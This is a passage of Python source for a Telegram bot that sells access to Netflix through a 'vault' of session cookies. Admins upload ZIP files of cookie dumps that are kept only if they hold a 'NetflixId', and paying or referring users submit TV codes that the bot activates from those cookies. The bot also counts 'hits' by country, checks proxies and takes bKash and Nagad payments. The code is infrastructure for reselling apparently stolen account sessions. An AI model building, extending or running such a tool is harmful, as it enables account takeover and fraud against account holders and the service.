    promo["uses"] = promo.get("uses", 0) + 1
    promo.setdefault("used_by", []).append(uid)
    save_json(PREMIUM_FILE, premium_data); save_json(PROMO_FILE, promo_codes)
    await update.message.reply_html(f"🎉 <b>+{days} days premium!</b>\nExpires: <code>{new_exp[:10]}</code>")

async def support_command(update, context):
    uid = update.effective_user.id
    if not context.args:
        await update.message.reply_html(
            "🆘 <b>Support</b>\n\nUsage: <code>/support Your message</code>\n\n"
            f"Or contact: {WATERMARK}")
        return
    msg = " ".join(context.args)[:500]
    ticket = {"user_id": uid, "username": update.effective_user.username or "Unknown",
              "message": msg, "time": datetime.now().isoformat(), "status": "open"}
    support_tickets.append(ticket)
    if len(support_tickets) > 1000: support_tickets[:] = support_tickets[-1000:]
    save_json(TICKETS_FILE, support_tickets)
    await update.message.reply_html("✅ Ticket sent!")
    for admin in ADMIN_IDS:
        try:
            await context.bot.send_message(admin,
                f"🆘 <b>Ticket</b>\nFrom: <code>{uid}</code>\n\n{safe_html(msg)}", parse_mode='HTML')
        except Exception: pass

# ============================================================
# TV COMMAND
# ============================================================
async def tv_command(update, context):
    uid = update.effective_user.id
    access, reason, rem = check_access(uid)
    if not access:
        await update.message.reply_text(f"⚠️ Denied ({reason})"); return
    if is_rate_limited(uid):
        await update.message.reply_text("⚠️ Slow down!"); return
    if not context.args:
        await update.message.reply_html("❌ Usage: <code>/tv 12345678</code>"); return
    code = re.sub(r'\D', '', context.args[0])
    if len(code) != 8:
        await update.message.reply_text("❌ 8 digits required!"); return
    if count_vault_cookies() == 0:
        await update.message.reply_text("😔 Vault empty!"); return
    msg = await update.message.reply_text(f"🔍 Starting...\n📺 {code}\n🍪 Vault: {count_vault_cookies()}")
    cf = user_state.get(uid, {}).get('country_filter')
    try:
        result = await asyncio.wait_for(asyncio.to_thread(process_tv_login, code, cf), timeout=180)
    except asyncio.TimeoutError:
        await msg.edit_text("⏰ Timeout!"); return
    consume_usage(uid)
    with tv_stats_lock:
        tv_stats["total_logins"] += 1
        if result["success"]: tv_stats["successful"] += 1
        else: tv_stats["failed"] += 1
    if result["success"]:
        r = (f"✅ <b>TV ACTIVATED!</b>\n\n📺 {code}\n"
             f"🌍 {result.get('country', 'N/A')}\n📦 {result.get('plan', 'N/A')}\n\n"
             f"<i>Your TV is ready! 🍿</i>")
    else:
        r = f"❌ Failed\n<code>{code}</code>\n{result.get('error', 'Unknown')}"
    try: await msg.edit_text(r, parse_mode='HTML')
    except Exception: pass

# ============================================================
# ADMIN COMMANDS
# ============================================================
async def upload_command(update, context):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS: return
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await update.message.reply_html("📎 Reply to ZIP with <code>/upload</code>"); return
    doc = update.message.reply_to_message.document
    if not doc.file_name.lower().endswith('.zip'):
        await update.message.reply_text("❌ Only .zip!"); return
    msg = await update.message.reply_text("📥 Downloading...")
    try:
        f = await context.bot.get_file(doc.file_id)
        zb = await f.download_as_bytearray()
        await msg.edit_text("📂 Extracting...")
        os.makedirs(COOKIES_DIR, exist_ok=True)
        added, skipped = 0, 0
        with zipfile.ZipFile(io.BytesIO(zb), 'r') as zf:
            for name in zf.namelist():
                if name.endswith('/') or name.startswith(('__MACOSX', '.')): continue
                if not name.lower().endswith(('.txt', '.json')):
                    skipped += 1; continue
                try:
                    content = zf.read(name).decode('utf-8', errors='ignore')
                    cks = extract_cookie_dict_tv(content)
                    if not cks or not cks.get('NetflixId'):
                        skipped += 1; continue
                    base = safe_filename(os.path.basename(name))
                    dest = os.path.join(COOKIES_DIR, base)
                    if os.path.exists(dest):
                        suf = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))
                        n, e = os.path.splitext(base)
                        dest = os.path.join(COOKIES_DIR, f"{n}_{suf}{e}")
                    with open(dest, 'w', encoding='utf-8') as f:
                        f.write(content)
                    added += 1
                except Exception: skipped += 1
        await msg.edit_text(
            f"✅ <b>Upload done!</b>\n📥 Added: <b>{added}</b>\n⏭️ Skipped: <b>{skipped}</b>\n"
            f"🍪 Total: <b>{count_vault_cookies()}</b>", parse_mode='HTML')
        log_audit(uid, "upload", f"+{added}")
    except Exception as e:
        await msg.edit_text(f"❌ {e}")

async def stats_command(update, context):
    if update.effective_user.id not in ADMIN_IDS: return
    with tv_stats_lock:
        msg = (f"📊 <b>Bot Stats</b>\n\n"
               f"👥 Users: <b>{len(users_data)}</b>\n"
               f"💎 Premium: <b>{sum(1 for x in premium_data if is_premium(int(x)))}</b>\n"
               f"🚫 Banned: <b>{len(banned_users)}</b>\n"
               f"🍪 Vault: <b>{count_vault_cookies()}</b>\n\n"
               f"📺 <b>TV</b>\nTotal: <b>{tv_stats['total_logins']}</b>\n"
               f"✅ <b>{tv_stats['successful']}</b> | ❌ <b>{tv_stats['failed']}</b>\n"
               f"⏰ {tv_stats['started_at']}")
    await update.message.reply_html(msg)

async def globalstats_command(update, context):
    if update.effective_user.id not in ADMIN_IDS: return
    txt = (f"🌐 <b>Global Stats</b>\n\n"
           f"💎 Total hits: <b>{hit_stats.get('total_hits', 0)}</b>\n\n"
           f"<b>Top Countries:</b>\n")
    for c, n in Counter(hit_stats.get('countries', {})).most_common(15):
        txt += f"• {safe_html(c)}: <b>{n}</b>\n"
    await update.message.reply_html(txt)

async def addpremium_command(update, context):
    if update.effective_user.id not in ADMIN_IDS: return
    if not context.args:
        await update.message.reply_text("Usage: /addpremium <id> [days]"); return
    try:
        t = context.args[0]
        d = int(context.args[1]) if len(context.args) > 1 else 30
        exp = (datetime.now() + timedelta(days=d)).isoformat()
        premium_data[t] = {"expires": exp}
        save_json(PREMIUM_FILE, premium_data)
        log_audit(update.effective_user.id, "addpremium", t)
        await update.message.reply_html(f"✅ <code>{t}</code> → {d}d")
        try:
            await context.bot.send_message(int(t), f"🎉 <b>+{d} days Premium!</b>", parse_mode='HTML')
        except Exception: pass
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def removepremium_command(update, context):
    if update.effective_user.id not in ADMIN_IDS or not context.args: return
    t = context.args[0]
    if t in premium_data:
        del premium_data[t]; save_json(PREMIUM_FILE, premium_data)
        log_audit(update.effective_user.id, "removepremium", t)
        await update.message.reply_text(f"✅ Removed: {t}")

async def ban_command(update, context):
    if update.effective_user.id not in ADMIN_IDS or not context.args: return
    try:
        t = int(context.args[0])
        banned_users.add(t); save_json(BANNED_FILE, list(banned_users))
        log_audit(update.effective_user.id, "ban", t)
        await update.message.reply_text(f"✅ Banned {t}")
    except Exception: pass

async def unban_command(update, context):
    if update.effective_user.id not in ADMIN_IDS or not context.args: return
    try:
        t = int(context.args[0])
        banned_users.discard(t); save_json(BANNED_FILE, list(banned_users))
        log_audit(update.effective_user.id, "unban", t)
        await update.message.reply_text(f"✅ Unbanned {t}")
    except Exception: pass

async def broadcast_command(update, context):
    if update.effective_user.id not in ADMIN_IDS or not context.args: return
    msg = " ".join(context.args)
    status = await update.message.reply_text(f"📢 Sending to {len(users_data)}...")
    sent, failed = 0, 0
    for uid in list(users_data):
        try:
            await context.bot.send_message(int(uid),
                f"📢 <b>Announcement</b>\n\n{safe_html(msg)}", parse_mode='HTML')
            sent += 1
        except Exception: failed += 1
        await asyncio.sleep(0.05)
    await status.edit_text(f"✅ Sent: {sent} | ❌ Failed: {failed}")

async def vault_command(update, context):
    if update.effective_user.id not in ADMIN_IDS: return
    await update.message.reply_html(f"🍪 Vault: <b>{count_vault_cookies()}</b> cookies")

async def addchannel_command(update, context):
    if update.effective_user.id not in ADMIN_IDS or not context.args: return
    ch = context.args[0]
    global FORCE_JOIN_CHANNELS, FORCE_JOIN_ENABLED
    if ch not in FORCE_JOIN_CHANNELS:
        FORCE_JOIN_CHANNELS.append(ch)
        CFG["FORCE_JOIN_CHANNELS"] = FORCE_JOIN_CHANNELS
        CFG["FORCE_JOIN_ENABLED"] = True
        save_json("config.json", CFG)
        FORCE_JOIN_ENABLED = True
        await update.message.reply_html(f"✅ Added: <code>{ch}</code>\n⚠️ Make bot admin!")

async def removechannel_command(update, context):
    if update.effective_user.id not in ADMIN_IDS or not context.args: return
    ch = context.args[0]
    global FORCE_JOIN_CHANNELS, FORCE_JOIN_ENABLED
    if ch in FORCE_JOIN_CHANNELS:
        FORCE_JOIN_CHANNELS.remove(ch)
        CFG["FORCE_JOIN_CHANNELS"] = FORCE_JOIN_CHANNELS
        CFG["FORCE_JOIN_ENABLED"] = len(FORCE_JOIN_CHANNELS) > 0
        save_json("config.json", CFG)
        FORCE_JOIN_ENABLED = len(FORCE_JOIN_CHANNELS) > 0
        await update.message.reply_html(f"✅ Removed: <code>{ch}</code>")

async def channels_command(update, context):
    if update.effective_user.id not in ADMIN_IDS: return
    if not FORCE_JOIN_CHANNELS:
        await update.message.reply_text("No channels."); return
    txt = "📢 <b>Force Join:</b>\n\n"
    for i, ch in enumerate(FORCE_JOIN_CHANNELS, 1):
        name = FORCE_JOIN_NAMES.get(ch, "")
        txt += f"{i}. <code>{ch}</code> — {name}\n"
    txt += f"\n<b>Status:</b> {'✅' if FORCE_JOIN_ENABLED else '❌'}"
    await update.message.reply_html(txt)

async def addpromo_command(update, context):
    if update.effective_user.id not in ADMIN_IDS: return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /addpromo CODE DAYS [MAX]"); return
    code = context.args[0].upper()
    try:
        days = int(context.args[1])
        max_uses = int(context.args[2]) if len(context.args) > 2 else 999999
    except Exception:
        await update.message.reply_text("Invalid!"); return
    promo_codes[code] = {"days": days, "max_uses": max_uses, "uses": 0, "used_by": []}
    save_json(PROMO_FILE, promo_codes)
    await update.message.reply_html(f"✅ <code>{code}</code> → {days}d × {max_uses}")

async def delpromo_command(update, context):
    if update.effective_user.id not in ADMIN_IDS or not context.args: return
    code = context.args[0].upper()
    if code in promo_codes:
        del promo_codes[code]; save_json(PROMO_FILE, promo_codes)
        await update.message.reply_text(f"✅ Deleted: {code}")

async def listpromo_command(update, context):
    if update.effective_user.id not in ADMIN_IDS: return
    if not promo_codes:
        await update.message.reply_text("No promo codes."); return
    txt = "🎟️ <b>Promos</b>\n\n"
    for code, d in promo_codes.items():
        txt += f"<code>{code}</code> — {d['days']}d | {d.get('uses', 0)}/{d.get('max_uses', 999999)}\n"
    await update.message.reply_html(txt)

async def audit_command(update, context):
    if update.effective_user.id not in ADMIN_IDS: return
    if not audit_log:
        await update.message.reply_text("No log."); return
    recent = audit_log[-20:]
    txt = "📝 <b>Audit</b>\n\n"
    for e in recent:
        txt += f"[{e['time'][:16]}] {e['admin']} → {e['action']}"
        if e.get('target'): txt += f" → {e['target']}"
        txt += "\n"
    await update.message.reply_html(txt)

async def tickets_command(update, context):
    if update.effective_user.id not in ADMIN_IDS: return
    open_tickets = [t for t in support_tickets if t.get("status") == "open"]
    if not open_tickets:
        await update.message.reply_text("No open tickets."); return
    txt = f"🆘 <b>Open Tickets ({len(open_tickets)})</b>\n\n"
    for t in open_tickets[-10:]:
        txt += f"<code>{t['user_id']}</code> ({t['time'][:16]}):\n{safe_html(t['message'])[:200]}\n\n"
    await update.message.reply_html(txt[:4000])

async def impersonate_command(update, context):
    if update.effective_user.id not in ADMIN_IDS: return
    if not context.args:
        await update.message.reply_text("Usage: /impersonate <user_id>"); return
    target = context.args[0]
    udata = users_data.get(target, {})
    hits = load_json(HITS_DB_FILE, {}).get(target, [])
    refs = referrals_data.get(target, {}).get('count', 0)
    txt = (f"👤 <b>Impersonate View</b>\n\n"
           f"🆔 <code>{target}</code>\n"
           f"📛 {safe_html(udata.get('username', '?'))}\n"
           f"🎬 Checks: <b>{udata.get('total_checks', 0)}</b>\n"
           f"💎 Hits: <b>{len(hits)}</b>\n"
           f"👥 Refs: <b>{refs}</b>\n"
           f"📅 Joined: {str(udata.get('joined', '?'))[:10]}\n"
           f"💎 Premium: <b>{'Yes' if is_premium(int(target)) else 'No'}</b>")
    await update.message.reply_html(txt)

async def maintenance_command(update, context):
    if update.effective_user.id not in ADMIN_IDS: return
    global MAINTENANCE_MODE
    MAINTENANCE_MODE = not MAINTENANCE_MODE
    status = "🔧 ON" if MAINTENANCE_MODE else "✅ OFF"
    await update.message.reply_html(f"Maintenance: <b>{status}</b>")

async def proxy_check_command(update, context):
    if update.effective_user.id not in ADMIN_IDS: return
    if not proxies_list:
        await update.message.reply_text("No proxies"); return
    msg = await update.message.reply_text(f"🔍 Testing {min(20, len(proxies_list))} proxies...")
    alive = 0
    loop = asyncio.get_running_loop()
    futs = [loop.run_in_executor(None, check_proxy_health, p) for p in proxies_list[:20]]
    results = await asyncio.gather(*futs, return_exceptions=True)
    for r in results:
        if r is True:
            alive += 1
    await msg.edit_text(f"✅ Alive: {alive}/{min(20, len(proxies_list))}")

async def cleanup_command(update, context):
    if update.effective_user.id not in ADMIN_IDS: return
    d = cleanup_old_cookies()
    await update.message.reply_html(f"🧹 Cleaned: <b>{d}</b> old cookies\n🍪 Remaining: <b>{count_vault_cookies()}</b>")

# ============================================================
# ADMIN PANEL
# ============================================================
def admin_panel_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📊 Stats", callback_data="adm_stats"),
         InlineKeyboardButton("🌐 Global Stats", callback_data="adm_globalstats")],
        [InlineKeyboardButton("👥 Users", callback_data="adm_users"),
         InlineKeyboardButton("💎 Premium List", callback_data="adm_premium")],
        [InlineKeyboardButton("🍪 Vault", callback_data="adm_vault"),
         InlineKeyboardButton("🆘 Tickets", callback_data="adm_tickets")],
        [InlineKeyboardButton("📢 Channels", callback_data="adm_channels"),
         InlineKeyboardButton("🎟️ Promos", callback_data="adm_promos")],
        [InlineKeyboardButton("📝 Audit Log", callback_data="adm_audit"),
         InlineKeyboardButton("📤 Broadcast Help", callback_data="adm_broadcast")],
        [InlineKeyboardButton("💰 Payments", callback_data="adm_payments"),
         InlineKeyboardButton("🔄 Refresh", callback_data="adm_refresh")],
        [InlineKeyboardButton("❌ Close", callback_data="adm_close")],
    ])

async def admin_command(update, context):
    uid = update.effective_user.id
    if uid not in ADMIN_IDS:
        await update.message.reply_text("🚫 Admin only!"); return
    msg = (
        "🎛️ <b>ADMIN CONTROL PANEL</b>\n\n"
        f"👑 Welcome, Admin!\n"
        f"🆔 <code>{uid}</code>\n\n"
        f"👥 Users: <b>{len(users_data)}</b>\n"
        f"💎 Premium: <b>{len(premium_data)}</b>\n"
        f"🍪 Vault: <b>{count_vault_cookies()}</b>\n"
        f"🆘 Open Tickets: <b>{len([t for t in support_tickets if t.get('status')=='open'])}</b>\n\n"
        f"<i>Select an option below:</i>")
    await update.message.reply_html(msg, reply_markup=admin_panel_markup())

async def admin_panel(update, context):
    q = update.callback_query
    uid = q.from_user.id
    if uid not in ADMIN_IDS:
        await q.answer("🚫 Admin only!", show_alert=True); return

    data = q.data

    if data == "adm_stats":
        await q.answer()
        with tv_stats_lock:
            uptime = time.time() - bot_start_time
            d = int(uptime // 86400); h = int((uptime % 86400) // 3600); m = int((uptime % 3600) // 60)
            txt = (
                f"📊 <b>Bot Statistics</b>\n\n"
                f"⏰ Uptime: <b>{d}d {h}h {m}m</b>\n"
                f"👥 Total Users: <b>{len(users_data)}</b>\n"
                f"💎 Premium: <b>{sum(1 for x in premium_data if is_premium(int(x)))}</b>\n"
                f"🎁 Trial: <b>{sum(1 for x in trial_users if is_trial_active(int(x)))}</b>\n"
                f"🚫 Banned: <b>{len(banned_users)}</b>\n"
                f"👥 Referrals: <b>{sum(r.get('count',0) for r in referrals_data.values())}</b>\n\n"
                f"🍪 Vault: <b>{count_vault_cookies()}</b>\n"
                f"🌐 Proxies: <b>{len(proxies_list)}</b>\n"
                f"💎 Global Hits: <b>{hit_stats.get('total_hits', 0)}</b>\n"
                f"⚡ Workers: <b>{MAX_WORKERS}</b>\n\n"
                f"📺 <b>TV Login</b>\n"
                f"Total: <b>{tv_stats['total_logins']}</b>\n"
                f"✅ <b>{tv_stats['successful']}</b> | ❌ <b>{tv_stats['failed']}</b>"
            )
        markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]])
        try: await q.message.edit_text(txt, parse_mode='HTML', reply_markup=markup)
        except Exception: await q.message.reply_html(txt, reply_markup=markup)
        return

    if data == "adm_globalstats":
        await q.answer()
        countries = Counter(hit_stats.get('countries', {}))
        txt = f"🌐 <b>Global Hit Analytics</b>\n\n💎 Total: <b>{hit_stats.get('total_hits', 0)}</b>\n\n<b>Top Countries:</b>\n"
        if countries:
            for i, (c, n) in enumerate(countries.most_common(20), 1):
                txt += f"{i}. {safe_html(c)}: <b>{n}</b>\n"
        else:
            txt += "<i>No data yet</i>"
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔄 Clear Stats", callback_data="adm_clearstats")],
            [InlineKeyboardButton("🔙 Back", callback_data="adm_back")]])
        try: await q.message.edit_text(txt, parse_mode='HTML', reply_markup=markup)
        except Exception: await q.message.reply_html(txt, reply_markup=markup)
        return

    if data == "adm_clearstats":
        await q.answer("Cleared!", show_alert=True)
        hit_stats["countries"] = {}
        hit_stats["total_hits"] = 0
        save_json(STATS_FILE, hit_stats)
        log_audit(uid, "clearstats")
        return

    if data == "adm_users":
        await q.answer()
        total = len(users_data)
        recent = list(users_data.items())[-15:]
        txt = f"👥 <b>Recent Users</b> (Total: {total})\n\n"
        for uid_s, u in reversed(recent):
            txt += f"• <code>{uid_s}</code> — {safe_html(u.get('username','?'))[:15]} | Checks: {u.get('total_checks',0)}\n"
        txt += f"\n<b>Actions:</b>\n<code>/addpremium ID DAYS</code>\n<code>/ban ID</code>\n<code>/unban ID</code>"
        markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]])
        try: await q.message.edit_text(txt, parse_mode='HTML', reply_markup=markup)
        except Exception: await q.message.reply_html(txt, reply_markup=markup)
        return

    if data == "adm_premium":
        await q.answer()
        active = [(u, d) for u, d in premium_data.items() if is_premium(int(u))]
        txt = f"💎 <b>Active Premium ({len(active)})</b>\n\n"
        for i, (u, d) in enumerate(active[:20], 1):
            exp = d.get('expires', '?')[:10]
            tier = d.get('tier', 'Basic')
            txt += f"{i}. <code>{u}</code> — {exp} [{tier}]\n"
        if len(active) > 20:
            txt += f"\n<i>...and {len(active)-20} more</i>"
        markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]])
        try: await q.message.edit_text(txt, parse_mode='HTML', reply_markup=markup)
        except Exception: await q.message.reply_html(txt, reply_markup=markup)
        return

    if data == "adm_vault":
        await q.answer()
        txt = (f"🍪 <b>Cookie Vault</b>\n\n"
               f"📦 Total: <b>{count_vault_cookies()}</b>\n\n"
               f"<b>Actions:</b>\n"
               f"• Reply to ZIP with <code>/upload</code>\n"
               f"• Cleanup: <code>/cleanup</code>")
        markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]])
        try: await q.message.edit_text(txt, parse_mode='HTML', reply_markup=markup)
        except Exception: await q.message.reply_html(txt, reply_markup=markup)
        return

    if data == "adm_tickets":
        await q.answer()
        open_t = [t for t in support_tickets if t.get('status') == 'open']
        txt = f"🆘 <b>Open Tickets ({len(open_t)})</b>\n\n"
        if open_t:
            for t in open_t[-10:]:
                txt += f"👤 <code>{t['user_id']}</code> ({t['time'][:16]})\n"
                txt += f"📝 {safe_html(t['message'])[:150]}\n\n"
        else:
            txt += "<i>No open tickets</i>"
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("🧹 Clear All", callback_data="adm_cleartickets")],
            [InlineKeyboardButton("🔙 Back", callback_data="adm_back")]])
        try: await q.message.edit_text(txt[:4000], parse_mode='HTML', reply_markup=markup)
        except Exception: await q.message.reply_html(txt[:4000], reply_markup=markup)
        return

    if data == "adm_cleartickets":
        await q.answer("Cleared!")
        for t in support_tickets: t['status'] = 'closed'
        save_json(TICKETS_FILE, support_tickets)
        return

    if data == "adm_channels":
        await q.answer()
        txt = "📢 <b>Force Join</b>\n\n"
        for i, ch in enumerate(FORCE_JOIN_CHANNELS, 1):
            name = FORCE_JOIN_NAMES.get(ch, "")
            txt += f"{i}. <code>{ch}</code>\n   └ {name}\n"
        txt += f"\n<b>Status:</b> {'✅ ON' if FORCE_JOIN_ENABLED else '❌ OFF'}\n\n"
        txt += "<b>Commands:</b>\n<code>/addchannel @ch</code>\n<code>/removechannel @ch</code>\n<code>/channels</code>"
        markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]])
        try: await q.message.edit_text(txt, parse_mode='HTML', reply_markup=markup)
        except Exception: await q.message.reply_html(txt, reply_markup=markup)
        return

    if data == "adm_promos":
        await q.answer()
        txt = f"🎟️ <b>Promo Codes ({len(promo_codes)})</b>\n\n"
        if promo_codes:
            for code, d in list(promo_codes.items())[:15]:
                txt += f"<code>{code}</code> — {d['days']}d | {d.get('uses',0)}/{d.get('max_uses',999999)}\n"
        else:
            txt += "<i>No promo codes</i>\n"
        txt += "\n<b>Commands:</b>\n<code>/addpromo CODE DAYS [MAX]</code>\n<code>/delpromo CODE</code>"
        markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]])
        try: await q.message.edit_text(txt, parse_mode='HTML', reply_markup=markup)
        except Exception: await q.message.reply_html(txt, reply_markup=markup)
        return

    if data == "adm_audit":
        await q.answer()
        recent = audit_log[-20:]
        txt = f"📝 <b>Audit Log</b> (Last 20 of {len(audit_log)})\n\n"
        for e in reversed(recent):
            txt += f"[{e['time'][11:16]}] <code>{e['admin']}</code> → {e['action']}"
            if e.get('target'): txt += f" → <code>{e['target']}</code>"
            txt += "\n"
        markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]])
        try: await q.message.edit_text(txt[:4000], parse_mode='HTML', reply_markup=markup)
        except Exception: await q.message.reply_html(txt[:4000], reply_markup=markup)
        return

    if data == "adm_broadcast":
        await q.answer()
        txt = (f"📤 <b>Broadcast</b>\n\n"
               f"Send message to all <b>{len(users_data)}</b> users.\n\n"
               f"<b>Command:</b>\n"
               f"<code>/broadcast Your message here</code>")
        markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]])
        try: await q.message.edit_text(txt, parse_mode='HTML', reply_markup=markup)
        except Exception: await q.message.reply_html(txt, reply_markup=markup)
        return

    if data == "adm_payments":
        await q.answer()
        pending = [p for p in payment_requests if p.get('status') == 'pending']
        txt = f"💰 <b>Payment Requests ({len(pending)})</b>\n\n"
        if pending:
            for p in pending[-10:]:
                txt += f"👤 <code>{p['user_id']}</code> | {p.get('amount','?')}৳ | {p.get('time','')[:16]}\n"
        else:
            txt += "<i>No pending requests</i>\n"
        markup = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="adm_back")]])
        try: await q.message.edit_text(txt, parse_mode='HTML', reply_markup=markup)
        except Exception: await q.message.reply_html(txt, reply_markup=markup)
        return

    if data in ("adm_refresh", "adm_back"):
        await q.answer("Refreshed!" if data == "adm_refresh" else "")
        msg = (
            "🎛️ <b>ADMIN CONTROL PANEL</b>\n\n"
            f"👑 Welcome, Admin!\n"
            f"🆔 <code>{uid}</code>\n\n"
            f"👥 Users: <b>{len(users_data)}</b>\n"
            f"💎 Premium: <b>{len(premium_data)}</b>\n"
            f"🍪 Vault: <b>{count_vault_cookies()}</b>\n"
            f"🆘 Open Tickets: <b>{len([t for t in support_tickets if t.get('status')=='open'])}</b>\n\n"
            f"<i>Select an option below:</i>")
        try: await q.message.edit_text(msg, parse_mode='HTML', reply_markup=admin_panel_markup())
        except Exception: await q.message.reply_html(msg, reply_markup=admin_panel_markup())
        return

    if data == "adm_close":
        await q.answer("Closed!")
        try: await q.message.delete()
        except Exception: pass
        return

    await q.answer()

# ============================================================
# USER CALLBACKS
# ============================================================
async def mode_button(update, context):
    q = update.callback_query
    uid = q.from_user.id
    data = q.data

    if data == "my_profile":
        await q.answer()
        try:
            uid_s = str(uid)
            udata = users_data.get(uid_s, {})
            db = load_json(HITS_DB_FILE, {})
            my_hits = db.get(uid_s, [])
            refs = referrals_data.get(uid_s, {}).get('count', 0)
            if uid in ADMIN_IDS: plan = "👑 Admin"
            elif is_premium(uid): plan = "💎 Premium"
            elif is_trial_active(uid): plan = "🎁 Trial"
            else: plan = "🆓 Free"
            msg = (f"👤 <b>Your Profile</b>\n\n"
                   f"🆔 ID: <code>{uid}</code>\n"
                   f"📛 Name: {safe_html(q.from_user.first_name or 'Unknown')}\n"
                   f"🎯 Plan: {plan}\n\n"
                   f"📊 <b>Stats</b>\n"
                   f"🎬 Checks: <b>{udata.get('total_checks', 0)}</b>\n"
                   f"💎 Hits: <b>{len(my_hits)}</b>\n"
                   f"👥 Referrals: <b>{refs}</b>\n"
                   f"🔥 Streak: <b>{user_streaks.get(uid_s, {}).get('streak', 0)}</b>")
            await q.message.reply_html(msg)
        except Exception as e:
            await q.message.reply_text(f"❌ {e}")
        return

    if data == "my_ref":
        await q.answer()
        try:
            bot_un = (await context.bot.get_me()).username
            link = f"https://t.me/{bot_un}?start=ref_{uid}"
            cnt = referrals_data.get(str(uid), {}).get('count', 0)
            needed = REFERRALS_TO_PREMIUM - (cnt % REFERRALS_TO_PREMIUM)
            msg = (f"🎁 <b>Your Referral Link</b>\n\n<code>{link}</code>\n\n"
                   f"👥 Referrals: <b>{cnt}</b>\n"
                   f"🎯 Need <b>{needed}</b> more for {REFERRAL_PREMIUM_DAYS} days\n\n"
                   f"⭐ <b>VIP Tiers:</b>\n"
                   f"🥉 5 refs → 7d\n🥈 15 refs → 30d\n🥇 30 refs → 60d\n💎 50 refs → 120d")
            await q.message.reply_html(msg, disable_web_page_preview=True)
        except Exception as e:
            await q.message.reply_text(f"❌ {e}")
        return

    if data == "my_streak":
        await q.answer()
        uid_s = str(uid)
        sdata = user_streaks.get(uid_s, {"streak": 0, "last": None, "total": 0})
        await q.message.reply_html(
            f"🔥 <b>Your Streak</b>\n\n"
            f"📅 Current: <b>{sdata['streak']} days</b>\n"
            f"🏆 Total: <b>{sdata.get('total', 0)}</b>\n"
            f"🕐 Last: {sdata.get('last', 'Never')}\n\n"
            f"<i>Use /streak daily to update!</i>")
        return

    if data == "my_watch":
        await q.answer()
        my_watch = watchlist_data.get(str(uid), [])
        if not my_watch:
            await q.message.reply_html("⭐ Empty watchlist\n\nReply to a message with /watch"); return
        txt = f"⭐ <b>Watchlist ({len(my_watch)})</b>\n\n"
        for i, item in enumerate(my_watch[-10:], 1):
            txt += f"{i}. {safe_html(str(item)[:80])}\n"
        await q.message.reply_html(txt)
        return

    if data == "my_history":
        await q.answer()
        hist = session_history.get(str(uid), [])
        if not hist:
            await q.message.reply_text("📭 No history"); return
        txt = "📜 <b>Sessions</b>\n\n"
        for h in hist[-10:]:
            txt += f"[{h['time'][:16]}] {h['mode']} | {h['total']} → 💎 {h['hits']}\n"
        await q.message.reply_html(txt)
        return

    if data == "ref_lb":
        await q.answer()
        lb = load_json(REF_LEADERBOARD_FILE, {})
        if not lb:
            await q.message.reply_text("No referrals yet!"); return
        sorted_lb = sorted(lb.items(), key=lambda x: x[1], reverse=True)[:10]
        txt = "🏆 <b>Top Referrers</b>\n\n"
        medals = ["🥇", "🥈", "🥉"]
        for i, (uid_s, cnt) in enumerate(sorted_lb, 1):
            m = medals[i-1] if i <= 3 else f"{i}."
            txt += f"{m} <code>{uid_s}</code> — <b>{cnt}</b>\n"
        await q.message.reply_html(txt)
        return

    if data == "toggle_notify":
        await q.answer()
        cur = notify_settings.get(str(uid), True)
        notify_settings[str(uid)] = not cur
        save_json(NOTIFY_FILE, notify_settings)
        await q.message.reply_html(
            f"Notifications: <b>{'🔔 ON' if notify_settings[str(uid)] else '🔕 OFF'}</b>")
        return

    if data == "help_menu":
        await q.answer()
        msg = ("📖 <b>Bot Help</b>\n\n"
               "Send /help to see all commands\n\n"
               f"{WATERMARK}")
        await q.message.reply_html(msg, disable_web_page_preview=True)
        return

    if data == "premium_menu":
        await q.answer()
        msg = (f"💎 <b>Buy Premium</b>\n\n<b>Plans:</b>\n"
               f"• 7 days — 50৳\n• 30 days — 150৳\n• 90 days — 400৳\n\n"
               f"<b>Payment:</b>\n"
               f"📱 bKash: <code>{PAYMENT_INFO.get('bkash','N/A')}</code>\n"
               f"📱 Nagad: <code>{PAYMENT_INFO.get('nagad','N/A')}</code>\n\n"
               f"<b>VIP Tiers (via referrals):</b>\n"
               f"🥉 5 refs → 7d | 🥈 15 refs → 30d\n"
               f"🥇 30 refs → 60d | 💎 50 refs → 120d")
        await q.message.reply_html(msg)
        return

    if data == "lang_menu":
        await q.answer()
        cur = user_lang.get(uid, 'en')
        markup = InlineKeyboardMarkup([
            [InlineKeyboardButton("🇬🇧 English", callback_data="setlang_en"),
             InlineKeyboardButton("🇧🇩 বাংলা", callback_data="setlang_bn")]])
        await q.message.reply_html(
            f"🌐 Current: <b>{'English' if cur == 'en' else 'বাংলা'}</b>",
            reply_markup=markup)
        return

    if data == "support_menu":
        await q.answer()
        await q.message.reply_html(
            "🆘 <b>Support</b>\n\n"
            "Send: <code>/support Your message</code>\n\n"
            f"Or contact: {WATERMARK}")
        return

    if data == "my_stats":
        await q.answer()
        try:
            uid_s = str(uid)
            db = load_json(HITS_DB_FILE, {})
            my = db.get(uid_s, [])
            countries = Counter(h.get('country', 'Unknown') for h in my)
            txt = f"📊 <b>Your Hit Stats</b>\n\n💎 Total: <b>{len(my)}</b>\n\n<b>By Country:</b>\n"
            if countries:
                for c, n in countries.most_common(10):
                    txt += f"• {safe_html(c)}: <b>{n}</b>\n"
            else:
                txt += "<i>No hits yet</i>"
            await q.message.reply_html(txt)
        except Exception as e:
            await q.message.reply_text(f"❌ {e}")
        return

